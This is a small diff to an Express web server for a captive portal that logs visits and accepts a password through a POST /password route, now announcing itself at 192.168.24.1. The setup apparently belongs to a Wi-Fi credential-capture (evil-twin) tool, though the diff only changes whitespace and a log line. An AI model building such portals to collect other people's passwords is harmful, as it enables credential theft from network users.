@@ -22,8 +22,9 @@ app.use('/html', express.static('html'));
 app.get("/", function(req, res) {
   console.log('The client entered to the captive portal');
   res.sendFile(__dirname+'/index.html');
-  
  });
+
+ 
  app.post('/password', (req, res) => {
   // In POST request the information is in the body
   // The information in our case is the password that the client entered
@@ -41,5 +42,6 @@ app.get("/", function(req, res) {
 var port = 70
 // Define the port that the web server will listen to
 app.listen(port, function() {
-    console.log(`WebServer is up. Listening at http://localhost:${port}`);
+    console.log(`WebServer is up. Listening at 192.168.24.1:${port}`);
+
 })
